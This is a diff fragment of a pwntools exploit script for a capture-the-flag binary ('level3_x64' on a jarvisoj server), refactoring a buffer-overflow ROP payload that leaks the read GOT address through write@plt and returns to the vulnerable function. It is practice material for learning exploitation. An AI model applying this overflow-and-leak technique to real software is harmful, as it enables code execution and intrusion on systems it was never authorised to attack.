@@ -132,13 +132,14 @@ from pwn import *
 r = remote("pwn2.jarvisoj.com",9883)
 e = ELF("./level3_x64")
 
-write_plt = hex(e.plt["write"])
-read_got = hex(e.got["read"])
-func = hex(e.symbols["vulnerable_function"])
+write_plt = e.plt["write"]
+read_got = e.got["read"]
+func = e.symbols["vulnerable_function"]
 rdi_ret = 0x4006b3
 rsi_ret = 0x4006b1
 
-payload1 = "A" * (0x80 + 8) + p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(int(read_got,16)) + p64(256) + p64(int(write_plt,16)) + p64(int(func,16))
+payload1 = "A" * (0x80 + 8) 
+payload1 += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(read_got) + p64(256) + p64(write_plt) + p64(func)
 
 r.recvline()
 r.send(payload1)
